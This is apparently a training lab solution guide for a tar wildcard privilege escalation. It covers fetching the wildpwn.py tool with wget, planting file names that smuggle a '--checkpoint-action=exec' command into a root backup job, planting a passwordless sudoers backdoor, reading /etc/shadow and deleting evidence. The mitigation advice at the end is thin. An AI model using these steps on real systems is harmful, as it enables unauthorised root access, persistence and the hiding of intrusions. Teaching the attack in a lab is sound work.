## Solution Guide: Exploiting `tar`

In this exercise, you'll play the part of a penetration tester hunting for vulnerabilities in a target system's backup procedures.

- You'll use the `wildpwn.py` tool to verify that the system's current configuration is indeed vulnerable to this kind of privilege escalation attack.

- Then, you'll research and suggest two mitigation strategies to protect the server in the future.

The goal of this activity is to act out the `tar` exploitation and research how to harden systems against this exploit. 

Completing this activity required the following steps: 

- Downloading `wildpwn.py` using a non-`sudo` user account. 
- Running the script to generate `.webscript`.
- Archiving the directory with `tar` to run the exploit.
- Verifying that your user can gain `sudo` access.
- Researching mitigation techniques. 

### Solutions

1. Using the following credentials, log in as `jane` and use `sudo -l` to verify that you have no `sudo` rights:

    - Username: `jane`
    - password: `password`


   In your VM, switch to the user `jane`, and verify that you have no `sudo` privileges:

   - Run `su jane`. Use `password` as the password.

   - Run `sudo -l` to confirm that you do not have **super user** privileges.

2. Next, we'll look for automated `tar` backup files that can be exploited. 

    -  As `jane`, navigate to your `~/Documents` directory in the terminal. Are there any archive files present?

        - What might the name of the file indicate? Use `ls -lat` to check the ownership of the archive. Why wouldn't this file belong to `jane`?

        - Delete the archive file. You'll now need to wait a minute or two to test to see if the archive file comes back. If the archive file comes back, this means it can be potentially exploited with a `wildcard attack`.

    - Now that we've confirmed there is a regenerating archive file that is potentially backing up the contents of `jane`'s `Document` directory, we'll continue with the following steps: 

        - Downloading the `wildpwn` exploit tool. 
        - Running it to create payloads.
        - Waiting for the automated `tar` backup system task also archive the malicious payload files, thus activating our exploit. 

    - Note that there is a subdirectory, `ExploitTar`, that has been created for your pen-testing tasks. Use this directory to run `wildpwn` in.

   Next, we'll look for automated `tar` backup files that can be exploited. 

  - As `jane`, run `cd ~/Documents`

  - Run `ls -l` to see the archive file, `jane_docs_backup.tar`.

      ```
      -rw-r--r-- 1 root root 286720 Apr 28 18:36 jane_docs_backup.tar
      ```

3. Download the [wildpwn.py](https://raw.githubusercontent.com/localh0t/wildpwn/master/wildpwn.py) attack tool to your `~/Documents/ExploitTar` directory. Do this from the command line, not the browser.

     - **Hint**: Use `wget` or `curl`.

    - Navigate to and check the contents of this directory before we execute the python script.

   - `cd ~/Documents/ExploitTar`

   - `wget https://raw.githubusercontent.com/localh0t/wildpwn/master/wildpwn.py`

   - Check the contents of the directory before running the script with `ls -lat`:

     ```

     -rwxr-xr-x 1 jane jane    0 Apr 28 13:51  f7
     -rwxr-xr-x 1 jane jane    0 Apr 28 13:51  f6
     -rwxr-xr-x 1 jane jane    0 Apr 28 13:51  f5
     -rwxr-xr-x 1 jane jane    0 Apr 28 13:51  f4
     -rwxr-xr-x 1 jane jane    0 Apr 28 13:51  f3
     -rwxr-xr-x 1 jane jane    0 Apr 28 13:51  f2
     -rwxr-xr-x 1 jane jane    0 Apr 28 13:51  f10
     -rwxr-xr-x 1 jane jane    0 Apr 28 13:51  f1
     ```


4. Use `wildpwn.py` to generate the malicious `tar` payload files within the `/home/jane/Documents/ExploitTar` directory, which is expected to be frequently backed up.

   - Remember: the exploit becomes staged when the system's automated backup task archives Jane's documents into the `tar` file that we found earlier.

   - If you are unsure how to use this file: after downloading the script, run `python wildpwn.py -h` to look up usage. If you are stuck, ask your instructor or TA for the proper command.

   - Run `ls` to check the directory for our newly created files. 

   - As the regular user `jane`, you just planted malicious files that will create the exploit file when they are automatically backed up by the system.

   Use `wildpwn.py` to generate the malicious files by running:

    - Within the `ExploitTar` directory, run `python wildpwn.py tar .` 
    
    - The output will show:

        ```
        [!] Selected payload: tar
        [+] Done! Now wait for something like: tar cf archive.tar * on ./. Good luck!
        ```

    -  Run `ls -lat` to see our new payload files:

        ```
        total 20
        drwxr-xr-x 3 jane jane 4096 Apr 28 18:41  .
        -rw-rw-r-- 1 jane jane    0 Apr 28 18:41 '--checkpoint=1'
        -rw-rw-r-- 1 jane jane    0 Apr 28 18:41 '--checkpoint-action=exec=sh .webscript'
        -rw-rw-r-- 1 jane jane  535 Apr 28 18:41  .webscript
        drwxr-xr-x 4 jane jane 4096 Apr 28 13:56  ..
        -rw-rw-r-- 1 jane jane 3699 Apr 28 13:54  wildpwn.py
        drwxr-xr-x 2 jane jane 4096 Apr 28 13:52 'important docs'
        -rwxr-xr-x 1 jane jane    0 Apr 28 13:51  f9
        -rwxr-xr-x 1 jane jane    0 Apr 28 13:51  f8
        ...
        ...
        ```

5. Now we wait. 

    - After waiting a minute or two, re-run the `ls` command but with the proper options to see the new hidden subdirectory. 
    
    - Navigate into that subdirectory and list its hidden file. This is the one you'll want to run to execute the `wildcard attack` exploit.

   After waiting 1-2 minutes, we can re-run `ls -lat` to see that the contents of the directory have changed!

    - Run `ls -lat` to see:

      ```
      total 20
      drwxr-xr-x 4 jane jane 4096 Apr 28 18:42  .
      drwxr-xr-x 2 root root 4096 Apr 28 18:42  .cache
      drwxr-xr-x 4 jane jane 4096 Apr 28 13:56  ..
      -rw-rw-r-- 1 jane jane 3699 Apr 28 13:54  wildpwn.py
      drwxr-xr-x 2 jane jane 4096 Apr 28 13:52 'important docs'
      -rwxr-xr-x 1 jane jane    0 Apr 28 13:51  f9
      -rwxr-xr-x 1 jane jane    0 Apr 28 13:51  f8
      ```

    - Our exploit file should exist inside of a newly created `.cache` directory, with the name, `.cachefile`.

      - Run `cd .cache` to navigate _into_ the `.cache` directory

      - Run `ls -lat` to show the hidden `.cachefile` exploit file. 
        
        - `-l`: shows a long-list format of the files. 
        - `-a`: shows entries starting with a `.`.
        - `-t`: sorts by time modified, which we want due to the nature of this exploit.


6. Time to run the exploit.  

    - While still in the hidden subdirectory, execute the hidden file within the terminal.

    - What happened to your command prompt that confirms this exploit worked?


   While still in the `.cache` subdirectory, execute the `.cachefile` within the terminal:

   - Run `./.cachefile`  

    - You'll see your user prompt change from `jane:$` to `root:#`!


7. As `root`, make `jane` a superuser with `sudo` access.  

    - Add `jane` to `/etc/sudoers` by running `visudo`. This will allow our user `jane` to run commands with superuser privileges. Also, specify the `NOPASSWD` rule for this user.

    - If you're not sure how to do this, there is a similar user set up under `root`'s **specifications**.

   Add `jane` to `/etc/sudoers` so that we'll be able to run any command with superuser privileges.s `root`:

   - As `root` run `visudo` and navigate to the following section of the file:

     ```bash
     # User privilege specification
     root    ALL=(ALL:ALL) ALL
     ```

   - Under that `root` permission, add the following line and save the file:  

     ```bash
     jane   ALL=(ALL) NOPASSWD:ALL
 
   - This should allow us to run `sudo` commands as `jane` without having to enter a password.


8. Let's test the our new privileges and then cover our tracks. 

    - Log back in as `jane` and verify that you can run commands with `sudo`. 
    
    - Then, remove the entire `ExploitTar` directory to cover your tracks.


   Log back in as `jane` and verify that you can run commands with `sudo`. 
  
    - Run `su jane`  

    - Test your `sudo` permissions with:

        - `sudo -l`, and then

        - `sudo cat /etc/shadow` 

     - If you can see the contents of this file, you have successfully carried out a `tar wildcard attack`, turning `jane` into a superuser!

     - Due to how you edited the `visudo` entry above, you shouldn't need to enter your password for this command. Password-less `sudo` permissions allow attackers to rapidly execute elevated instructions on a target machine.

    - Remove the `ExploitTar` directory entirely to cover your tracks.

        - Run `rm -r ~/Documents/ExploitTar`


9. Congratulations! You have successfully executed what is known as a `tar wildcard attack`! This is a more discreet attack that can be carried out on Unix-based operating system with `tar` installed. 

    - After verifying that you can  escalate privileges and modify the system to catastrophic effect, identify two ways to prevent this attack in the future.

   Ways to prevent this attack in the future include:

   - Preventing users from downloading files from untrusted sources. This will involve enforcing stricter **permissions** on where users can save files.

   - Using a tool like `tripwire` to watch the file system for suspicious changes. This will alert you whenever a user downloaded files like `wildpwn.py`, or when backups create files like `.cache/.cachefile`.
    
   - Use a tool like `lynis` to scan the system for security vulnerabilities on a regular basis. This will make it more likely that you will identify malicious files before they have a chance to damage the system.
